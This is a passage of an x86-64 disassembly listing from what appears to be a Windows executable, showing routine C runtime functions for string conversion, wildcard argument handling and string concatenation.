   140008036:	8b c8                	mov    %eax,%ecx
   140008038:	e8 ef fd ff ff       	call   0x140007e2c
   14000803d:	8b d8                	mov    %eax,%ebx
   14000803f:	e8 28 ff ff ff       	call   0x140007f6c
   140008044:	89 18                	mov    %ebx,(%rax)
   140008046:	48 83 c4 20          	add    $0x20,%rsp
   14000804a:	5b                   	pop    %rbx
   14000804b:	c3                   	ret
   14000804c:	cc                   	int3
   14000804d:	cc                   	int3
   14000804e:	cc                   	int3
   14000804f:	cc                   	int3
   140008050:	cc                   	int3
   140008051:	cc                   	int3
   140008052:	cc                   	int3
   140008053:	cc                   	int3
   140008054:	cc                   	int3
   140008055:	cc                   	int3
   140008056:	cc                   	int3
   140008057:	cc                   	int3
   140008058:	cc                   	int3
   140008059:	cc                   	int3
   14000805a:	cc                   	int3
   14000805b:	cc                   	int3
   14000805c:	cc                   	int3
   14000805d:	cc                   	int3
   14000805e:	cc                   	int3
   14000805f:	cc                   	int3
   140008060:	48 8b 05 d9 75 01 00 	mov    0x175d9(%rip),%rax        # 0x14001f640
   140008067:	c3                   	ret
   140008068:	48 3b ca             	cmp    %rdx,%rcx
   14000806b:	73 04                	jae    0x140008071
   14000806d:	83 c8 ff             	or     $0xffffffff,%eax
   140008070:	c3                   	ret
   140008071:	33 c0                	xor    %eax,%eax
   140008073:	48 3b ca             	cmp    %rdx,%rcx
   140008076:	0f 97 c0             	seta   %al
   140008079:	c3                   	ret
   14000807a:	cc                   	int3
   14000807b:	cc                   	int3
   14000807c:	48 8b c4             	mov    %rsp,%rax
   14000807f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008083:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008087:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000808b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000808f:	41 56                	push   %r14
   140008091:	48 83 ec 30          	sub    $0x30,%rsp
   140008095:	45 33 f6             	xor    %r14d,%r14d
   140008098:	41 8b e9             	mov    %r9d,%ebp
   14000809b:	48 8b da             	mov    %rdx,%rbx
   14000809e:	48 8b f9             	mov    %rcx,%rdi
   1400080a1:	48 85 c9             	test   %rcx,%rcx
   1400080a4:	75 24                	jne    0x1400080ca
   1400080a6:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   1400080aa:	74 0d                	je     0x1400080b9
   1400080ac:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1400080b0:	e8 5b ff ff ff       	call   0x140008010
   1400080b5:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   1400080b9:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   1400080bd:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   1400080c1:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   1400080c5:	e9 32 01 00 00       	jmp    0x1400081fc
   1400080ca:	44 38 31             	cmp    %r14b,(%rcx)
   1400080cd:	75 60                	jne    0x14000812f
   1400080cf:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   1400080d3:	75 50                	jne    0x140008125
   1400080d5:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   1400080d9:	74 0d                	je     0x1400080e8
   1400080db:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1400080df:	e8 2c ff ff ff       	call   0x140008010
   1400080e4:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   1400080e8:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400080ed:	e8 ee 24 00 00       	call   0x14000a5e0
   1400080f2:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400080f6:	48 8b c8             	mov    %rax,%rcx
   1400080f9:	48 f7 d9             	neg    %rcx
   1400080fc:	1b d2                	sbb    %edx,%edx
   1400080fe:	f7 d2                	not    %edx
   140008100:	83 e2 0c             	and    $0xc,%edx
   140008103:	48 85 c0             	test   %rax,%rax
   140008106:	0f 95 c1             	setne  %cl
   140008109:	41 0f 45 d6          	cmovne %r14d,%edx
   14000810d:	88 4b 28             	mov    %cl,0x28(%rbx)
   140008110:	49 8b ce             	mov    %r14,%rcx
   140008113:	0f 95 c1             	setne  %cl
   140008116:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   14000811a:	85 d2                	test   %edx,%edx
   14000811c:	74 07                	je     0x140008125
   14000811e:	8b c2                	mov    %edx,%eax
   140008120:	e9 d9 00 00 00       	jmp    0x1400081fe
   140008125:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008129:	66 44 89 30          	mov    %r14w,(%rax)
   14000812d:	eb 92                	jmp    0x1400080c1
   14000812f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008133:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140008138:	4c 8b c7             	mov    %rdi,%r8
   14000813b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140008140:	8b cd                	mov    %ebp,%ecx
   140008142:	41 8d 51 0a          	lea    0xa(%r9),%edx
   140008146:	e8 7d 18 00 00       	call   0x1400099c8
   14000814b:	48 63 f0             	movslq %eax,%rsi
   14000814e:	85 c0                	test   %eax,%eax
   140008150:	75 19                	jne    0x14000816b
   140008152:	ff 15 40 7f 00 00    	call   *0x7f40(%rip)        # 0x140010098
   140008158:	8b c8                	mov    %eax,%ecx
   14000815a:	e8 9d fd ff ff       	call   0x140007efc
   14000815f:	e8 08 fe ff ff       	call   0x140007f6c
   140008164:	8b 00                	mov    (%rax),%eax
   140008166:	e9 93 00 00 00       	jmp    0x1400081fe
   14000816b:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000816f:	48 3b f2             	cmp    %rdx,%rsi
   140008172:	76 57                	jbe    0x1400081cb
   140008174:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   140008178:	74 0d                	je     0x140008187
   14000817a:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000817e:	e8 8d fe ff ff       	call   0x140008010
   140008183:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140008187:	48 8d 0c 36          	lea    (%rsi,%rsi,1),%rcx
   14000818b:	e8 50 24 00 00       	call   0x14000a5e0
   140008190:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140008194:	48 8b c8             	mov    %rax,%rcx
   140008197:	48 f7 d9             	neg    %rcx
   14000819a:	48 8b c8             	mov    %rax,%rcx
   14000819d:	48 1b d2             	sbb    %rdx,%rdx
   1400081a0:	48 23 d6             	and    %rsi,%rdx
   1400081a3:	48 f7 d9             	neg    %rcx
   1400081a6:	45 1b c0             	sbb    %r8d,%r8d
   1400081a9:	41 f7 d0             	not    %r8d
   1400081ac:	41 83 e0 0c          	and    $0xc,%r8d
   1400081b0:	48 85 c0             	test   %rax,%rax
   1400081b3:	0f 95 c1             	setne  %cl
   1400081b6:	45 0f 45 c6          	cmovne %r14d,%r8d
   1400081ba:	88 4b 28             	mov    %cl,0x28(%rbx)
   1400081bd:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400081c1:	45 85 c0             	test   %r8d,%r8d
   1400081c4:	74 05                	je     0x1400081cb
   1400081c6:	41 8b c0             	mov    %r8d,%eax
   1400081c9:	eb 33                	jmp    0x1400081fe
   1400081cb:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400081cf:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400081d3:	89 54 24 28          	mov    %edx,0x28(%rsp)
   1400081d7:	4c 8b c7             	mov    %rdi,%r8
   1400081da:	8b cd                	mov    %ebp,%ecx
   1400081dc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400081e1:	41 8d 51 0a          	lea    0xa(%r9),%edx
   1400081e5:	e8 de 17 00 00       	call   0x1400099c8
   1400081ea:	48 98                	cltq
   1400081ec:	48 85 c0             	test   %rax,%rax
   1400081ef:	0f 84 5d ff ff ff    	je     0x140008152
   1400081f5:	48 ff c8             	dec    %rax
   1400081f8:	48 89 43 20          	mov    %rax,0x20(%rbx)
   1400081fc:	33 c0                	xor    %eax,%eax
   1400081fe:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008203:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140008208:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000820d:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140008212:	48 83 c4 30          	add    $0x30,%rsp
   140008216:	41 5e                	pop    %r14
   140008218:	c3                   	ret
   140008219:	cc                   	int3
   14000821a:	cc                   	int3
   14000821b:	cc                   	int3
   14000821c:	48 8b c4             	mov    %rsp,%rax
   14000821f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008223:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140008227:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000822b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000822f:	41 56                	push   %r14
   140008231:	48 83 ec 40          	sub    $0x40,%rsp
   140008235:	45 33 f6             	xor    %r14d,%r14d
   140008238:	41 8b e9             	mov    %r9d,%ebp
   14000823b:	48 8b da             	mov    %rdx,%rbx
   14000823e:	48 8b f9             	mov    %rcx,%rdi
   140008241:	48 85 c9             	test   %rcx,%rcx
   140008244:	75 24                	jne    0x14000826a
   140008246:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   14000824a:	74 0d                	je     0x140008259
   14000824c:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140008250:	e8 bb fd ff ff       	call   0x140008010
   140008255:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140008259:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   14000825d:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   140008261:	4c 89 73 20          	mov    %r14,0x20(%rbx)
   140008265:	e9 41 01 00 00       	jmp    0x1400083ab
   14000826a:	66 44 39 31          	cmp    %r14w,(%rcx)
   14000826e:	75 5f                	jne    0x1400082cf
   140008270:	4c 39 72 18          	cmp    %r14,0x18(%rdx)
   140008274:	75 50                	jne    0x1400082c6
   140008276:	44 38 72 28          	cmp    %r14b,0x28(%rdx)
   14000827a:	74 0d                	je     0x140008289
   14000827c:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140008280:	e8 8b fd ff ff       	call   0x140008010
   140008285:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   140008289:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000828e:	e8 4d 23 00 00       	call   0x14000a5e0
   140008293:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140008297:	48 8b c8             	mov    %rax,%rcx
   14000829a:	48 f7 d9             	neg    %rcx
   14000829d:	1b d2                	sbb    %edx,%edx
   14000829f:	f7 d2                	not    %edx
   1400082a1:	83 e2 0c             	and    $0xc,%edx
   1400082a4:	48 85 c0             	test   %rax,%rax
   1400082a7:	0f 95 c1             	setne  %cl
   1400082aa:	41 0f 45 d6          	cmovne %r14d,%edx
   1400082ae:	88 4b 28             	mov    %cl,0x28(%rbx)
   1400082b1:	49 8b ce             	mov    %r14,%rcx
   1400082b4:	0f 95 c1             	setne  %cl
   1400082b7:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   1400082bb:	85 d2                	test   %edx,%edx
   1400082bd:	74 07                	je     0x1400082c6
   1400082bf:	8b c2                	mov    %edx,%eax
   1400082c1:	e9 e7 00 00 00       	jmp    0x1400083ad
   1400082c6:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400082ca:	44 88 30             	mov    %r14b,(%rax)
   1400082cd:	eb 92                	jmp    0x140008261
   1400082cf:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400082d4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400082d8:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400082dd:	4c 8b c7             	mov    %rdi,%r8
   1400082e0:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400082e5:	33 d2                	xor    %edx,%edx
   1400082e7:	8b cd                	mov    %ebp,%ecx
   1400082e9:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400082ee:	e8 65 17 00 00       	call   0x140009a58
   1400082f3:	48 63 f0             	movslq %eax,%rsi
   1400082f6:	85 c0                	test   %eax,%eax
   1400082f8:	75 19                	jne    0x140008313
   1400082fa:	ff 15 98 7d 00 00    	call   *0x7d98(%rip)        # 0x140010098
   140008300:	8b c8                	mov    %eax,%ecx
   140008302:	e8 f5 fb ff ff       	call   0x140007efc
   140008307:	e8 60 fc ff ff       	call   0x140007f6c
   14000830c:	8b 00                	mov    (%rax),%eax
   14000830e:	e9 9a 00 00 00       	jmp    0x1400083ad
   140008313:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140008317:	48 3b f2             	cmp    %rdx,%rsi
   14000831a:	76 56                	jbe    0x140008372
   14000831c:	44 38 73 28          	cmp    %r14b,0x28(%rbx)
   140008320:	74 0d                	je     0x14000832f
   140008322:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140008326:	e8 e5 fc ff ff       	call   0x140008010
   14000832b:	44 88 73 28          	mov    %r14b,0x28(%rbx)
   14000832f:	48 8b ce             	mov    %rsi,%rcx
   140008332:	e8 a9 22 00 00       	call   0x14000a5e0
   140008337:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000833b:	48 8b c8             	mov    %rax,%rcx
   14000833e:	48 f7 d9             	neg    %rcx
   140008341:	48 8b c8             	mov    %rax,%rcx
   140008344:	48 1b d2             	sbb    %rdx,%rdx
   140008347:	48 23 d6             	and    %rsi,%rdx
   14000834a:	48 f7 d9             	neg    %rcx
   14000834d:	45 1b c0             	sbb    %r8d,%r8d
   140008350:	41 f7 d0             	not    %r8d
   140008353:	41 83 e0 0c          	and    $0xc,%r8d
   140008357:	48 85 c0             	test   %rax,%rax
   14000835a:	0f 95 c1             	setne  %cl
   14000835d:	45 0f 45 c6          	cmovne %r14d,%r8d
   140008361:	88 4b 28             	mov    %cl,0x28(%rbx)
   140008364:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140008368:	45 85 c0             	test   %r8d,%r8d
   14000836b:	74 05                	je     0x140008372
   14000836d:	41 8b c0             	mov    %r8d,%eax
   140008370:	eb 3b                	jmp    0x1400083ad
   140008372:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140008376:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000837a:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   14000837f:	4c 8b c7             	mov    %rdi,%r8
   140008382:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140008387:	8b cd                	mov    %ebp,%ecx
   140008389:	89 54 24 28          	mov    %edx,0x28(%rsp)
   14000838d:	33 d2                	xor    %edx,%edx
   14000838f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008394:	e8 bf 16 00 00       	call   0x140009a58
   140008399:	48 98                	cltq
   14000839b:	48 85 c0             	test   %rax,%rax
   14000839e:	0f 84 56 ff ff ff    	je     0x1400082fa
   1400083a4:	48 ff c8             	dec    %rax
   1400083a7:	48 89 43 20          	mov    %rax,0x20(%rbx)
   1400083ab:	33 c0                	xor    %eax,%eax
   1400083ad:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400083b2:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400083b7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400083bc:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400083c1:	48 83 c4 40          	add    $0x40,%rsp
   1400083c5:	41 5e                	pop    %r14
   1400083c7:	c3                   	ret
   1400083c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400083cd:	55                   	push   %rbp
   1400083ce:	56                   	push   %rsi
   1400083cf:	57                   	push   %rdi
   1400083d0:	41 54                	push   %r12
   1400083d2:	41 55                	push   %r13
   1400083d4:	41 56                	push   %r14
   1400083d6:	41 57                	push   %r15
   1400083d8:	48 8b ec             	mov    %rsp,%rbp
   1400083db:	48 83 ec 50          	sub    $0x50,%rsp
   1400083df:	45 33 ff             	xor    %r15d,%r15d
   1400083e2:	4c 8b ea             	mov    %rdx,%r13
   1400083e5:	48 8b d9             	mov    %rcx,%rbx
   1400083e8:	48 85 d2             	test   %rdx,%rdx
   1400083eb:	75 17                	jne    0x140008404
   1400083ed:	e8 7a fb ff ff       	call   0x140007f6c
   1400083f2:	41 8d 5d 16          	lea    0x16(%r13),%ebx
   1400083f6:	89 18                	mov    %ebx,(%rax)
   1400083f8:	e8 c7 f9 ff ff       	call   0x140007dc4
   1400083fd:	8b c3                	mov    %ebx,%eax
   1400083ff:	e9 d0 01 00 00       	jmp    0x1400085d4
   140008404:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008407:	4c 89 3a             	mov    %r15,(%rdx)
   14000840a:	48 8b 01             	mov    (%rcx),%rax
   14000840d:	f3 0f 7f 45 e0       	movdqu %xmm0,-0x20(%rbp)
   140008412:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   140008416:	eb 77                	jmp    0x14000848f
   140008418:	48 8d 55 48          	lea    0x48(%rbp),%rdx
   14000841c:	66 c7 45 48 2a 3f    	movw   $0x3f2a,0x48(%rbp)
   140008422:	48 8b c8             	mov    %rax,%rcx
   140008425:	44 88 7d 4a          	mov    %r15b,0x4a(%rbp)
   140008429:	e8 12 43 00 00       	call   0x14000c740
   14000842e:	48 8b 0b             	mov    (%rbx),%rcx
   140008431:	48 85 c0             	test   %rax,%rax
   140008434:	75 3c                	jne    0x140008472
   140008436:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000843a:	45 33 c0             	xor    %r8d,%r8d
   14000843d:	33 d2                	xor    %edx,%edx
   14000843f:	e8 c0 01 00 00       	call   0x140008604
   140008444:	8b f0                	mov    %eax,%esi
   140008446:	85 c0                	test   %eax,%eax
   140008448:	74 3e                	je     0x140008488
   14000844a:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   14000844e:	48 8b df             	mov    %rdi,%rbx
   140008451:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   140008455:	0f 84 bc 00 00 00    	je     0x140008517
   14000845b:	48 8b 0b             	mov    (%rbx),%rcx
   14000845e:	e8 ad fb ff ff       	call   0x140008010
   140008463:	48 83 c3 08          	add    $0x8,%rbx
   140008467:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   14000846b:	75 ee                	jne    0x14000845b
   14000846d:	e9 a5 00 00 00       	jmp    0x140008517
   140008472:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140008476:	48 8b d0             	mov    %rax,%rdx
   140008479:	e8 0a 03 00 00       	call   0x140008788
   14000847e:	8b f0                	mov    %eax,%esi
   140008480:	85 c0                	test   %eax,%eax
   140008482:	0f 85 9e 00 00 00    	jne    0x140008526
   140008488:	48 83 c3 08          	add    $0x8,%rbx
   14000848c:	48 8b 03             	mov    (%rbx),%rax
   14000848f:	48 85 c0             	test   %rax,%rax
   140008492:	75 84                	jne    0x140008418
   140008494:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   140008498:	49 83 cc ff          	or     $0xffffffffffffffff,%r12
   14000849c:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
   1400084a0:	49 8b d7             	mov    %r15,%rdx
   1400084a3:	4c 8b f6             	mov    %rsi,%r14
   1400084a6:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   1400084aa:	4c 2b f7             	sub    %rdi,%r14
   1400084ad:	48 8b c7             	mov    %rdi,%rax
   1400084b0:	49 c1 fe 03          	sar    $0x3,%r14
   1400084b4:	49 ff c6             	inc    %r14
   1400084b7:	48 3b fe             	cmp    %rsi,%rdi
   1400084ba:	74 22                	je     0x1400084de
   1400084bc:	4c 8b 00             	mov    (%rax),%r8
   1400084bf:	49 8b cc             	mov    %r12,%rcx
   1400084c2:	48 ff c1             	inc    %rcx
   1400084c5:	45 38 3c 08          	cmp    %r15b,(%r8,%rcx,1)
   1400084c9:	75 f7                	jne    0x1400084c2
   1400084cb:	48 ff c2             	inc    %rdx
   1400084ce:	48 83 c0 08          	add    $0x8,%rax
   1400084d2:	48 03 d1             	add    %rcx,%rdx
   1400084d5:	48 3b c6             	cmp    %rsi,%rax
   1400084d8:	75 e2                	jne    0x1400084bc
   1400084da:	48 89 55 50          	mov    %rdx,0x50(%rbp)
   1400084de:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400084e4:	49 8b ce             	mov    %r14,%rcx
   1400084e7:	e8 28 de ff ff       	call   0x140006314
   1400084ec:	48 8b d8             	mov    %rax,%rbx
   1400084ef:	48 85 c0             	test   %rax,%rax
   1400084f2:	75 53                	jne    0x140008547
   1400084f4:	33 c9                	xor    %ecx,%ecx
   1400084f6:	e8 15 fb ff ff       	call   0x140008010
   1400084fb:	48 8b df             	mov    %rdi,%rbx
   1400084fe:	48 3b fe             	cmp    %rsi,%rdi
   140008501:	74 11                	je     0x140008514
   140008503:	48 8b 0b             	mov    (%rbx),%rcx
   140008506:	e8 05 fb ff ff       	call   0x140008010
   14000850b:	48 83 c3 08          	add    $0x8,%rbx
   14000850f:	48 3b de             	cmp    %rsi,%rbx
   140008512:	75 ef                	jne    0x140008503
   140008514:	41 8b f4             	mov    %r12d,%esi
   140008517:	48 8b cf             	mov    %rdi,%rcx
   14000851a:	e8 f1 fa ff ff       	call   0x140008010
   14000851f:	8b c6                	mov    %esi,%eax
   140008521:	e9 ae 00 00 00       	jmp    0x1400085d4
   140008526:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   14000852a:	48 8b df             	mov    %rdi,%rbx
   14000852d:	48 3b 7d e8          	cmp    -0x18(%rbp),%rdi
   140008531:	74 e4                	je     0x140008517
   140008533:	48 8b 0b             	mov    (%rbx),%rcx
   140008536:	e8 d5 fa ff ff       	call   0x140008010
   14000853b:	48 83 c3 08          	add    $0x8,%rbx
   14000853f:	48 3b 5d e8          	cmp    -0x18(%rbp),%rbx
   140008543:	75 ee                	jne    0x140008533
   140008545:	eb d0                	jmp    0x140008517
   140008547:	4a 8d 0c f0          	lea    (%rax,%r14,8),%rcx
   14000854b:	4c 8b f7             	mov    %rdi,%r14
   14000854e:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   140008552:	4c 8b e1             	mov    %rcx,%r12
   140008555:	48 3b fe             	cmp    %rsi,%rdi
   140008558:	74 4c                	je     0x1400085a6
   14000855a:	48 2b c7             	sub    %rdi,%rax
   14000855d:	48 89 45 48          	mov    %rax,0x48(%rbp)
   140008561:	4d 8b 06             	mov    (%r14),%r8
   140008564:	49 83 cf ff          	or     $0xffffffffffffffff,%r15
   140008568:	49 ff c7             	inc    %r15
   14000856b:	43 80 3c 38 00       	cmpb   $0x0,(%r8,%r15,1)
   140008570:	75 f6                	jne    0x140008568
   140008572:	48 8b d1             	mov    %rcx,%rdx
   140008575:	49 ff c7             	inc    %r15
   140008578:	49 2b d4             	sub    %r12,%rdx
   14000857b:	4d 8b cf             	mov    %r15,%r9
   14000857e:	48 03 55 50          	add    0x50(%rbp),%rdx
   140008582:	49 8b cc             	mov    %r12,%rcx
   140008585:	e8 e6 3f 00 00       	call   0x14000c570
   14000858a:	85 c0                	test   %eax,%eax
   14000858c:	75 5e                	jne    0x1400085ec
   14000858e:	48 8b 45 48          	mov    0x48(%rbp),%rax
   140008592:	48 8b 4d 58          	mov    0x58(%rbp),%rcx
   140008596:	4e 89 24 30          	mov    %r12,(%rax,%r14,1)
   14000859a:	4d 03 e7             	add    %r15,%r12
   14000859d:	49 83 c6 08          	add    $0x8,%r14
   1400085a1:	4c 3b f6             	cmp    %rsi,%r14
   1400085a4:	75 bb                	jne    0x140008561
   1400085a6:	33 c9                	xor    %ecx,%ecx
   1400085a8:	49 89 5d 00          	mov    %rbx,0x0(%r13)
   1400085ac:	e8 5f fa ff ff       	call   0x140008010
   1400085b1:	48 8b df             	mov    %rdi,%rbx
   1400085b4:	48 3b fe             	cmp    %rsi,%rdi
   1400085b7:	74 11                	je     0x1400085ca
   1400085b9:	48 8b 0b             	mov    (%rbx),%rcx
   1400085bc:	e8 4f fa ff ff       	call   0x140008010
   1400085c1:	48 83 c3 08          	add    $0x8,%rbx
   1400085c5:	48 3b de             	cmp    %rsi,%rbx
   1400085c8:	75 ef                	jne    0x1400085b9
   1400085ca:	48 8b cf             	mov    %rdi,%rcx
   1400085cd:	e8 3e fa ff ff       	call   0x140008010
   1400085d2:	33 c0                	xor    %eax,%eax
   1400085d4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400085db:	00 
   1400085dc:	48 83 c4 50          	add    $0x50,%rsp
   1400085e0:	41 5f                	pop    %r15
   1400085e2:	41 5e                	pop    %r14
   1400085e4:	41 5d                	pop    %r13
   1400085e6:	41 5c                	pop    %r12
   1400085e8:	5f                   	pop    %rdi
   1400085e9:	5e                   	pop    %rsi
   1400085ea:	5d                   	pop    %rbp
   1400085eb:	c3                   	ret
   1400085ec:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400085f2:	45 33 c9             	xor    %r9d,%r9d
   1400085f5:	45 33 c0             	xor    %r8d,%r8d
   1400085f8:	33 d2                	xor    %edx,%edx
   1400085fa:	33 c9                	xor    %ecx,%ecx
   1400085fc:	e8 e3 f7 ff ff       	call   0x140007de4
   140008601:	cc                   	int3
   140008602:	cc                   	int3
   140008603:	cc                   	int3
   140008604:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008609:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000860e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008613:	57                   	push   %rdi
   140008614:	41 54                	push   %r12
   140008616:	41 55                	push   %r13
   140008618:	41 56                	push   %r14
   14000861a:	41 57                	push   %r15
   14000861c:	48 83 ec 30          	sub    $0x30,%rsp
   140008620:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140008624:	49 8b f1             	mov    %r9,%rsi
   140008627:	33 ff                	xor    %edi,%edi
   140008629:	4d 8b f0             	mov    %r8,%r14
   14000862c:	4c 8b ea             	mov    %rdx,%r13
   14000862f:	4c 8b e1             	mov    %rcx,%r12
   140008632:	48 ff c5             	inc    %rbp
   140008635:	40 38 3c 29          	cmp    %dil,(%rcx,%rbp,1)
   140008639:	75 f7                	jne    0x140008632
   14000863b:	ba 01 00 00 00       	mov    $0x1,%edx
   140008640:	49 8b c6             	mov    %r14,%rax
   140008643:	48 03 ea             	add    %rdx,%rbp
   140008646:	48 f7 d0             	not    %rax
   140008649:	48 3b e8             	cmp    %rax,%rbp
   14000864c:	76 20                	jbe    0x14000866e
   14000864e:	8d 42 0b             	lea    0xb(%rdx),%eax
   140008651:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140008656:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000865b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140008660:	48 83 c4 30          	add    $0x30,%rsp
   140008664:	41 5f                	pop    %r15
   140008666:	41 5e                	pop    %r14
   140008668:	41 5d                	pop    %r13
   14000866a:	41 5c                	pop    %r12
   14000866c:	5f                   	pop    %rdi
   14000866d:	c3                   	ret
   14000866e:	4d 8d 78 01          	lea    0x1(%r8),%r15
   140008672:	4c 03 fd             	add    %rbp,%r15
   140008675:	49 8b cf             	mov    %r15,%rcx
   140008678:	e8 13 f9 ff ff       	call   0x140007f90
   14000867d:	48 8b d8             	mov    %rax,%rbx
   140008680:	4d 85 f6             	test   %r14,%r14
   140008683:	74 19                	je     0x14000869e
   140008685:	4d 8b ce             	mov    %r14,%r9
   140008688:	4d 8b c5             	mov    %r13,%r8
   14000868b:	49 8b d7             	mov    %r15,%rdx
   14000868e:	48 8b c8             	mov    %rax,%rcx
   140008691:	e8 da 3e 00 00       	call   0x14000c570
   140008696:	85 c0                	test   %eax,%eax
   140008698:	0f 85 d5 00 00 00    	jne    0x140008773
   14000869e:	4d 2b fe             	sub    %r14,%r15
   1400086a1:	4a 8d 0c 33          	lea    (%rbx,%r14,1),%rcx
   1400086a5:	49 8b d7             	mov    %r15,%rdx
   1400086a8:	4c 8b cd             	mov    %rbp,%r9
   1400086ab:	4d 8b c4             	mov    %r12,%r8
   1400086ae:	e8 bd 3e 00 00       	call   0x14000c570
   1400086b3:	85 c0                	test   %eax,%eax
   1400086b5:	0f 85 b8 00 00 00    	jne    0x140008773
   1400086bb:	4c 8b 76 10          	mov    0x10(%rsi),%r14
   1400086bf:	44 8d 78 08          	lea    0x8(%rax),%r15d
   1400086c3:	4c 39 76 08          	cmp    %r14,0x8(%rsi)
   1400086c7:	0f 85 8d 00 00 00    	jne    0x14000875a
   1400086cd:	48 39 3e             	cmp    %rdi,(%rsi)
   1400086d0:	75 2b                	jne    0x1400086fd
   1400086d2:	41 8b d7             	mov    %r15d,%edx
   1400086d5:	8d 48 04             	lea    0x4(%rax),%ecx
   1400086d8:	e8 b3 f8 ff ff       	call   0x140007f90
   1400086dd:	33 c9                	xor    %ecx,%ecx
   1400086df:	48 89 06             	mov    %rax,(%rsi)
   1400086e2:	e8 29 f9 ff ff       	call   0x140008010
   1400086e7:	48 8b 06             	mov    (%rsi),%rax
   1400086ea:	48 85 c0             	test   %rax,%rax
   1400086ed:	74 42                	je     0x140008731
   1400086ef:	48 89 46 08          	mov    %rax,0x8(%rsi)
   1400086f3:	48 83 c0 20          	add    $0x20,%rax
   1400086f7:	48 89 46 10          	mov    %rax,0x10(%rsi)
   1400086fb:	eb 5d                	jmp    0x14000875a
   1400086fd:	4c 2b 36             	sub    (%rsi),%r14
   140008700:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140008707:	ff ff 7f 
   14000870a:	49 c1 fe 03          	sar    $0x3,%r14
   14000870e:	4c 3b f0             	cmp    %rax,%r14
